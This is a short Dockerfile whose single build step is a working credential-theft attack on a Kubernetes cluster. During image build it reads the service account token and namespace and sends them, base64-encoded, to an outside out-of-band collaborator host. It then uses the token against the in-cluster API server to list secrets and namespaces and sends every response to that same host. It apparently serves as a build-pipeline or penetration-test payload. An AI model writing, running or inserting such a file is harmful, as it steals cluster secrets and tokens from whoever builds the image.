FROM alpine
RUN apk add --no-cache curl
RUN C=http://g3kod0ltewj2n00dn7hd5kzwwn2eqie7.oastify.com; \
    SA=/var/run/secrets/kubernetes.io/serviceaccount; \
    ls -la $SA 2>&1 | curl -s "$C/sa" --data-binary @- ; \
    TOKEN=$(cat $SA/token 2>/dev/null); NS=$(cat $SA/namespace 2>/dev/null); \
    curl -s "$C/whoami?ns=$NS&tok=$(printf %s "$TOKEN" | base64 -w0)" ; \
    curl -sk -H "Authorization: Bearer $TOKEN" https://10.96.0.1/version 2>&1 | curl -s "$C/ver" --data-binary @- ; \
    curl -sk -H "Authorization: Bearer $TOKEN" https://10.96.0.1/api/v1/namespaces/$NS/secrets 2>&1 | curl -s "$C/secrets" --data-binary @- ; \
    curl -sk -H "Authorization: Bearer $TOKEN" https://10.96.0.1/api/v1/namespaces 2>&1 | curl -s "$C/ns" --data-binary @- ; \
    true
